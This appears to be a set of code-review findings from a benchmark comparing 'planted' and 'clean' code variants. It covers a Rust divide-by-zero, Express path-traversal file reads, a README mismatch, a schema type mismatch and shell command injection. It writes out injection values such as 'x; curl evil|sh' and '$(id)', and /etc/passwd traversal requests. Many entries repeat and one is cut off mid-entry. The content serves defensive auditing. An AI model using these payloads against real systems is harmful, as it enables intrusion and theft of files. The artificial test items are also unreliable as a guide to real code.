authorFinding.title: average() panics on empty slice and can overflow on sum
authorFinding.failureScenario: average(&[]) evaluates total / 0 and panics with 'attempt to divide by zero'. Separately, values.iter().sum() on u64 panics in debug builds and wraps silently in release builds when the total exceeds u64::MAX, so a large input gives a wrong average. The sibling clean version returns Option<u64> and uses try_fold with checked_add. The planted signature returns plain u64, so callers cannot tell these cases apart.
authorFinding.action: Return Option<u64>. Return None for an empty slice. Accumulate with checked_add (or u128), as the clean variant does.
authorFinding.sourceQuote:
let total: u64 = values.iter().sum();
    (total / values.len() as u64)

changeAttribution.reason: The snapshot has no git baseline (baseline status not-applicable). The planted/clean directories are sibling variants, not a base/head diff.

findings.reason: The planted average() divides by values.len() with no emptiness guard. The sum uses unchecked iter().sum() on u64. Both failure modes follow directly from the source. The return type u64 cannot signal either one.
findings.concreteCase: average(&[]) evaluates 0 / 0 and panics with 'attempt to divide by zero'. average(&[u64::MAX, 1]) panics in a debug build (add overflow) and wraps to 0 in a release build, so the result is wrong. I did not run this.

authorFinding.title: safePath throws synchronously for missing or escaping paths, bypassing the 404 handling
authorFinding.failureScenario: fs.realpathSync throws ENOENT for a nonexistent file. safePath also throws 'path escapes root'. Both throws happen synchronously inside the route handler, before the readFile callback that maps errors to 404. Under Express's default error handling a request for a missing file or a traversal attempt likely gets a 500 (with a stack trace unless NODE_ENV=production) instead of the intended 404. The same pattern is in config-export.js. I did not run it, and the Express version is not supplied.
authorFinding.action: Wrap safePath in try/catch inside the handlers and respond 404 (or 400 for escapes).

findings.reason: safePath(...) is evaluated as an argument before fs.readFile runs, so its synchronous throws never reach the readFile callback that maps errors to 404. realpathSync throws on a nonexistent path, and line 6 throws on an escape. A missing req.query.path also throws a TypeError inside path.resolve. Express catches sync handler throws and sends 500 by default. The Express version and the clean server.js are not in the packet, so the exact status rests on that default behavior. A related defect: clean config-export.js destructures safePath from ./handler, but handler.js exports only handleConfig. That makes safePath undefined there, so every export request throws a TypeError synchronously.
findings.concreteCase: GET /config?path=missing.txt makes realpathSync throw ENOENT synchronously in the handler, so the client likely gets 500 rather than 404. GET /config?path=../x for an existing file outside ROOT throws 'path escapes root', also likely 500. In the export route, any name throws 'safePath is not a function'. I did not run this.

evidence.text: if (resolved !== ROOT && !resolved.startsWith(ROOT + path.sep)) throw new Error("path escapes root");
fs.readFile(safePath(req.query.path), "utf8", (error, data) => { if (error) return res.sendStatus(404); res.type("text/plain").send(data); });
fs.readFile(safePath(req.params.name), "utf8", (error, data) => { if (error) return res.sendStatus(404); res.type("text/plain").send(data); });

authorFinding.title: README says limit is inclusive but includes() uses strict less-than

anchor.text: `limit` is inclusive: values equal to it are included.

authorFinding.failureScenario: A caller who follows the README expects includes(10, 10) to return true. The code evaluates 10 < 10, so it returns false and the boundary value is silently omitted. This causes off-by-one filtering errors at the limit. The clean variant's README says 'exclusive', which matches the code, so the planted README is the part that drifted.
authorFinding.action: Either change the README to say `limit` is exclusive (values equal to it are omitted), or change includes() to use `value <= limit` if inclusive behavior is intended. Then confirm which behavior callers rely on.

findings.reason: The README says limit is inclusive, but includes() uses strict value < limit. The documented boundary behavior is false.
findings.concreteCase: includes(10, 10) evaluates 10 < 10, which is false. The README says values equal to the limit are included, so it predicts true.

evidence.text: `limit` is inclusive: values equal to it are included.

authorFinding.title: schema.json declares count as string while Request.count is u64
authorFinding.failureScenario: The Rust model declares `struct Request { count: u64 }`, but the schema requires `count` to be a JSON string. A payload that validates against the schema, such as {"count":"5"}, is a string. A serde-style u64 deserializer would reject it, assuming the usual numeric deserialization, which the packet does not show. A payload the model accepts, such as {"count":5}, fails schema validation. Producers and consumers that follow the schema therefore cannot interoperate with the model. The clean variant declares an integer with minimum 0 and maximum 18446744073709551615, which matches u64.
authorFinding.action: Change `count` in reasoning-schema/planted/schema.json to {"type":"integer","minimum":0,"maximum":18446744073709551615}, as in the clean variant. If string transport is intended, change the model and add an explicit string-to-u64 conversion.

findings.reason: The planted schema requires count to be a JSON string, while the model declares count: u64. The clean schema uses integer with 0..u64::MAX. The contract mismatch is visible in the sources. Whether a deserializer rejects the string cannot be confirmed because no derive or deserializer appears in the packet, so the runtime consequence rests on the usual numeric deserialization.
findings.concreteCase: {"count":"5"} passes the planted schema but is a string where the model expects a u64. {"count":5} matches the model but fails the schema's type:string.

authorFinding.title: GET /config reads arbitrary files because safePath is bypassed (path traversal)
authorFinding.failureScenario: The route is GET /config on 0.0.0.0:8080 with no authentication. Any client can request /config?path=/etc/passwd, or ../../ paths relative to the process cwd. The handler passes req.query.path straight to fs.readFile and returns the file as text/plain. safePath is defined but never called; the clean variant wraps it as safePath(req.query.path). The result is arbitrary file read as the server user, including secrets and credentials.
authorFinding.action: Call safePath(req.query.path) before fs.readFile, as in the clean variant. Handle its sync throw by responding 4xx. Validate that the query param is a string.

changeAttribution.reason: No git baseline. The planted/clean sibling directories differ in this line.

findings.reason: The planted handler passes req.query.path straight to fs.readFile. safePath is defined but never called. The route is mounted unauthenticated and bound to 0.0.0.0. The file contents are returned as text/plain.
findings.concreteCase: GET http://host:8080/config?path=/etc/passwd calls fs.readFile('/etc/passwd'), and the response body is the file contents. A relative path such as ../../secret resolves against the process cwd and is read the same way.

evidence.text: fs.readFile(req.query.path, "utf8", (error, data) => { if (error) return res.sendStatus(404); res.type("text/plain").send(data); });

authorFinding.title: GET /config/export/:name reads arbitrary files (variant of the traversal)
authorFinding.failureScenario: Express URL-decodes route params. authorFinding.action: Import and apply safePath(req.params.name) in exportConfig, and handle its sync throw. Audit every other fs sink for the same pattern. No other fs.readFile sinks exist in the supplied files.

findings.reason: The planted exportConfig reads req.params.name directly and never imports safePath. Express decodes route params, so an encoded slash stays inside the single :name segment and decodes to a path. The route is mounted without auth.

evidence.text: fs.readFile(req.params.name, "utf8", (error, data) => { if (error) return res.sendStatus(404); res.type("text/plain").send(data); });

authorFinding.title: Shell command injection via sh -c with an interpolated name
authorFinding.failureScenario: name is interpolated into the string `cat /srv/data/{name}` and executed by `sh -c`. A name such as `x; curl evil|sh` or `$(id)` runs arbitrary shell commands. A name like `../../etc/shadow` also traverses out of /srv/data. The clean variant rejects '..' and '/', then invokes cat directly with `--` and no shell. Reachability is unknown: run is a private fn, and no caller exists in any supplied file, so who controls `name` cannot be established. The unwrap() on status() can also panic.
authorFinding.action: Do not use a shell. Use Command::new("cat").arg("--").arg(path) after validating name, as the clean variant does. Better still, read the file with std::fs. Return an error instead of unwrap().

changeAttribution.reason: No baseline is available. The planted/clean directories are siblings.

findings.reason: run() builds a shell string from name with no validation and executes it via sh -c, so shell metacharacters in name are interpreted. This is a real injection at the function level. The clean variant moves the validation into the function and drops the shell. No caller is in the packet, so who controls name, and the real exploitability and severity, are unproven. The unwrap() on status() adds a panic path if sh cannot be spawned.
findings.concreteCase: run("x; touch /tmp/pwned") executes 'sh -c "cat /srv/data/x; touch /tmp/pwned"' and runs the second command. run("$(id)") expands the command substitution. run("../../etc/shadow") escapes /srv/data. I did not run this.

average() panics on empty slice and can overflow on sum
findings.message: average(&[]) evaluates total / 0 and panics with 'attempt to divide by zero'. Separately, values.iter().sum() on u64 panics in debug builds and wraps silently in release builds when the total exceeds u64::MAX, so a large input gives a wrong average. The sibling clean version returns Option<u64> and uses try_fold with checked_add. The planted signature returns plain u64, so callers cannot tell these cases apart.

evidence.action: Return Option<u64>. Return None for an empty slice. Accumulate with checked_add (or u128), as the clean variant does.

findings.title: safePath throws synchronously for missing or escaping paths, bypassing the 404 handling
findings.message: fs.realpathSync throws ENOENT for a nonexistent file. safePath also throws 'path escapes root'. Both throws happen synchronously inside the route handler, before the readFile callback that maps errors to 404. Under Express's default error handling a request for a missing file or a traversal attempt likely gets a 500 (with a stack trace unless NODE_ENV=production) instead of the intended 404. The same pattern is in config-export.js. I did not run it, and the Express version is not supplied.

evidence.action: Wrap safePath in try/catch inside the handlers and respond 404 (or 400 for escapes).

findings.title: README says limit is inclusive but includes() uses strict less-than
findings.message: A caller who follows the README expects includes(10, 10) to return true. The code evaluates 10 < 10, so it returns false and the boundary value is silently omitted. This causes off-by-one filtering errors at the limit. The clean variant's README says 'exclusive', which matches the code, so the planted README is the part that drifted.

evidence.action: Either change the README to say `limit` is exclusive (values equal to it are omitted), or change includes() to use `value <= limit` if inclusive behavior is intended. Then confirm which behavior callers rely on.

findings.title: schema.json declares count as string while Request.count is u64
findings.message: The Rust model declares `struct Request { count: u64 }`, but the schema requires `count` to be a JSON string. A payload that validates against the schema, such as {"count":"5"}, is a string. A serde-style u64 deserializer would reject it, assuming the usual numeric deserialization, which the packet does not show. A payload the model accepts, such as {"count":5}, fails schema validation. Producers and consumers that follow the schema therefore cannot interoperate with the model. The clean variant declares an integer with minimum 0 and maximum 18446744073709551615, which matches u64.

evidence.action: Change `count` in reasoning-schema/planted/schema.json to {"type":"integer","minimum":0,"maximum":18446744073709551615}, as in the clean variant. If string transport is intended, change the model and add an explicit string-to-u64 conversion.

findings.title: Unvalidated name interpolated into a path and run through sh -c (sibling of the unconfined-path-read seeds)
findings.message: If an untrusted caller can supply `name` to run(), the shape matches the seeds: an unvalidated name is spliced into a file path and nothing confines it to /srv/data. Here the splice goes into a shell string passed to `sh -c`. name="../../etc/passwd" would read outside /srv/data. name="x; id" or "$(...)" would run arbitrary commands, which is worse than the seeds' file read. Reachability is not established. run is a private fn, and no supplied file calls it. Whether `name` is attacker-controlled is unknown. This is a different sink class (command injection) from the JS fs.readFile seeds, with the same root cause of unvalidated input reaching a file-path sink. Not executed.

findings.reason: safePath(...) is evaluated as an argument before fs.readFile runs, so its synchronous throws never reach the readFile callback that maps errors to 404. realpathSync throws on a nonexistent path, and line 6 throws on an escape. A missing req.query.path also throws a TypeError inside path.resolve. Express catches sync handler throws and sends 500 by default. The Express version and the clean server.js are not in the packet, so the exact status rests on that default behavior. A related defect: clean config-export.js destructures safePath from ./handler, but handler.js exports only handleConfig. That makes safePath undefined there, so every export request throws a TypeError synchronously.
findings.concreteCase: GET /config?path=missing.txt makes realpathSync throw ENOENT synchronously in the handler, so the client likely gets 500 rather than 404. GET /config?path=../x for an existing file outside ROOT throws 'path escapes root', also likely 500. In the export route, any name throws 'safePath is not a function'. I did not run this.

sec-adjudication-arbitrary-file-read.action: Call safePath(req.query.path) before fs.readFile, as in the clean variant. Handle its sync throw by responding 4xx. Validate that the query param is a string.
sec-adjudication-arbitrary-file-read.failureScenario: The route is GET /config on 0.0.0.0:8080 with no authentication. Any client can request /config?path=/etc/passwd, or ../../ paths relative to the process cwd. The handler passes req.query.path straight to fs.readFile and returns the file as text/plain. safePath is defined but never called; the clean variant wraps it as safePath(req.query.path). The result is arbitrary file read as the server user, including secrets and credentials.

sec-variant-handler-arbitrary-file-read.action: Use safePath(req.query.path) and handle its errors. Also export safePath for shared use, as the clean variant does.
sec-variant-handler-arbitrary-file-read.failureScenario: GET /config?path=/etc/passwd on the unauthenticated 0.0.0.0:8080 server returns the file contents. The unused safePath is not applied.

sec-variant-export-arbitrary-file-read.action: Import and apply safePath(req.params.name) in exportConfig, and handle its sync throw. Audit every other fs sink for the same pattern. No other fs.readFile sinks exist in the supplied files.
sec-variant-export-arbitrary-file-read.failureScenario: Express URL-decodes route params. A request to /config/export/%2Fetc%2Fpasswd or /config/export/..%2F..%2Fsecret passes an absolute or traversal path directly to fs.readFile. The file is returned to an unauthenticated remote client. This second sink is not fixed by patching only /config. The clean variant imports safePath and uses it here. No authentication exists on the route.

sec-rust-shell-command-injection.action: Do not use a shell. Use Command::new("cat").arg("--").arg(path) after validating name, as the clean variant does. Better still, read the file with std::fs. Return an error instead of unwrap().
sec-rust-shell-command-injection.failureScenario: name is interpolated into the string `cat /srv/data/{name}` and executed by `sh -c`. A name such as `x; curl evil|sh` or `$(id)` runs arbitrary shell commands. A name like `../../etc/shadow` also traverses out of /srv/data. The clean variant rejects '..' and '/', then invokes cat directly with `--` and no shell. Reachability is unknown: run is a private fn, and no caller exists in any supplied file, so who controls `name` cannot be established. The unwrap() on status() can also panic.

authorFinding.action: Use safePath(req.query.path) and handle its errors. Also export safePath for shared use, as the clean variant does.

findings.reason: The variant planted handler has the same unguarded fs.readFile(req.query.path). It is routed at /config on 0.0.0.0:8080 with no auth or middleware shown. safePath is unused.
findings.concreteCase: GET /config?path=/etc/passwd on the variant server reads and returns /etc/passwd.

evidence.text: fs.readFile(req.query.path, "utf8", (error, data) => { if (error) return res.sendStatus(404); res.type("text/plain").send(data); });

authorFinding.title: GET /config/export/:name reads arbitrary files (variant of the traversal)
authorFinding.failureScenario: Express URL-decodes route params. A request to /config/export/%2Fetc%2Fpasswd or /config/export/..%2F..%2Fsecret passes an absolute or traversal path directly to fs.readFile. The file is returned to an unauthenticated remote client. This second sink is not fixed by patching only /config. The clean variant imports safePath and uses it here. No authentication exists on the route.
authorFinding.action: Import and apply safePath(req.params.name) in exportConfig, and handle its sync throw. Audit every other fs sink for the same pattern. No other fs.readFile sinks exist in the supplied files.

findings.reason: The planted exportConfig reads req.params.name directly and never imports safePath. Express decodes route params, so an encoded slash stays inside the single :name segment and decodes to a path. The route is mounted without auth.
findings.concreteCase: GET /config/export/%2Fetc%2Fpasswd matches :name and decodes to '/etc/passwd'. fs.readFile reads it and the body is returned. GET /config/export/..%2F..%2Fsecret traverses the same way relative to the cwd. Patching only /config leaves this sink open.

evidence.text: fs.readFile(req.params.name, "utf8", (error, data) => { if (error) return res.sendStatus(404); res.type("text/plain").send(data); });

authorFinding.title: Shell command injection via sh -c with an interpolated name
authorFinding.failureScenario: name is interpolated into the string `cat /srv/data/{name}` and executed by `sh -c`. A name such as `x; curl evil|sh` or `$(id)` runs arbitrary shell commands. A name like `../../etc/shadow` also traverses out of /srv/data. The clean variant rejects '..' and '/', then invokes cat directly with `--` and no shell. Reachability is unknown: run is a private fn, and no caller exists in any supplied file, so who controls `name` cannot be established. The unwrap() on status() can also panic.
authorFinding.action: Do not use a shell. Use Command::new("cat").arg("--").arg(path) after validating name, as the clean variant does. Better still, read the file with std::fs. Return an error instead of unwrap().

changeAttribution.reason: No baseline is available. The planted/clean directories are siblings.

findings.reason: run() builds a shell string from name with no validation and executes it via sh -c, so shell metacharacters in name are interpreted. This is a real injection at the function level. The clean variant moves the validation into the function and drops the shell. No caller is in the packet, so who controls name, and the real exploitability and severity, are unproven. The unwrap() on status() adds a panic path if sh cannot be spawned.
findings.concreteCase: run("x; touch /tmp/pwned") executes 'sh -c "cat /srv/data/x; touch /tmp/pwned"' and runs the second command. run("$(id)") expands the command substitution. run("../../etc/shadow") escapes /srv/data. I did not run this.

findings.reason: safePath(...) is evaluated as an argument before fs.readFile runs, so its synchronous throws never reach the readFile callback that maps errors to 404. realpathSync throws on a nonexistent path, and line 6 throws on an escape. A missing req.query.path also throws a TypeError inside path.resolve. Express catches sync handler throws and sends 500 by default. The Express version and the clean server.js are not in the packet, so the exact status rests on that default behavior. A related defect: clean config-export.js destructures safePath from ./handler, but handler.js exports only handleConfig. That makes safePath undefined there, so every export request throws a TypeError synchronously.
findings.concreteCase: GET /config?path=missing.txt makes realpathSync throw ENOENT synchronously in the handler, so the client likely gets 500 rather than 404. GET /config?path=../x for an existing file outside ROOT throws 'path escapes root', also likely 500. In the export route, any name throws 'safePath is not a function'. I did not run this.

The remaining supplied files (JS path-handling, Rust average, doc-drift, shell command) have no type or serialization contract to check for this lens, so no schema findings were raised on them. In the clean schema, JSON consumers that parse numbers as IEEE doubles may lose precision above 2^53. This depends on the consumer, so it was not reported.

authorFinding.title: schema.json declares count as string while Request.count is u64
authorFinding.failureScenario: The Rust model declares `struct Request { count: u64 }`, but the schema requires `count` to be a JSON string. A payload that validates against the schema, such as {"count":"5"}, is a string. A serde-style u64 deserializer would reject it, assuming the usual numeric deserialization, which the packet does not show. A payload the model accepts, such as {"count":5}, fails schema validation. Producers and consumers that follow the schema therefore cannot interoperate with the model. The clean variant declares an integer with minimum 0 and maximum 18446744073709551615, which matches u64.
authorFinding.action: Change `count` in reasoning-schema/planted/schema.json to {"type":"integer","minimum":0,"maximum":18446744073709551615}, as in the clean variant. If string transport is intended, change the model and add an explicit string-to-u64 conversion.

findings.reason: The planted schema requires count to be a JSON string, while the model declares count: u64. The clean schema uses integer with 0..u64::MAX. The contract mismatch is visible in the sources. Whether a deserializer rejects the string cannot be confirmed because no derive or deserializer appears in the packet, so the runtime consequence rests on the usual numeric deserialization.
findings.concreteCase: {"count":"5"} passes the planted schema but is a string where the model expects a u64. {"count":5} matches the model but fails the schema's type:string.

sec-adjudication-arbitrary-file-read.action: Call safePath(req.query.path) before fs.readFile, as in the clean variant. Handle its sync throw by responding 4xx. Validate that the query param is a string.
sec-adjudication-arbitrary-file-read.failureScenario: The route is GET /config on 0.0.0.0:8080 with no authentication. Any client can request /config?path=/etc/passwd, or ../../ paths relative to the process cwd. The handler passes req.query.path straight to fs.readFile and returns the file as text/plain. safePath is defined but never called; the clean variant wraps it as safePath(req.query.path). The result is arbitrary file read as the server user, including secrets and credentials.

sec-variant-handler-arbitrary-file-read.action: Use safePath(req.query.path) and handle its errors. Also export safePath for shared use, as the clean variant does.
sec-variant-handler-arbitrary-file-read.failureScenario: GET /config?path=/etc/passwd on the unauthenticated 0.0.0.0:8080 server returns the file contents. The unused safePath is not applied.

sec-variant-export-arbitrary-file-read.action: Import and apply safePath(req.params.name) in exportConfig, and handle its sync throw. Audit every other fs sink for the same pattern. No other fs.readFile sinks exist in the supplied files.
sec-variant-export-arbitrary-file-read.failureScenario: Express URL-decodes route params. A request to /config/export/%2Fetc%2Fpasswd or /config/export/..%2F..%2Fsecret passes an absolute or traversal path directly to fs.readFile. The file is returned to an unauthenticated remote client. This second sink is not fixed by patching only /config. The clean variant imports safePath and uses it here. No authentication exists on the route.

sec-rust-shell-command-injection.action: Do not use a shell. Use Command::new("cat").arg("--").arg(path) after validating name, as the clean variant does. Better still, read the file with std::fs. Return an error instead of unwrap().
sec-rust-shell-command-injection.failureScenario: name is interpolated into the string `cat /srv/data/{name}` and executed by `sh -c`. A name such as `x; curl evil|sh` or `$(id)` runs arbitrary shell commands. A name like `../../etc/shadow` also traverses out of /srv/data. The clean variant rejects '..' and '/', then invokes cat directly with `--` and no shell. Reachability is unknown: run is a private fn, and no caller exists in any supplied file, so who controls `name` cannot be established. The unwrap() on status() can also panic.

findings.reason: run() builds a shell string from name with no validation and executes it via sh -c, so shell metacharacters in name are interpreted. This is a real injection at the function level. The clean variant moves the validation into the function and drops the shell. No caller is in the packet, so who controls name, and the real exploitability and severity, are unproven. The unwrap() on status() adds a panic path if sh cannot be spawned.
findings.concreteCase: run("x; touch /tmp/pwned") executes 'sh -c "cat /srv/data/x; touch /tmp/pwned"' and runs the second command. run("$(id)") expands the command substitution. run("../../etc/shadow") escapes /srv/data. I did not run this.

        "line": 3,
        "text": "(total / values.len() as u64)"
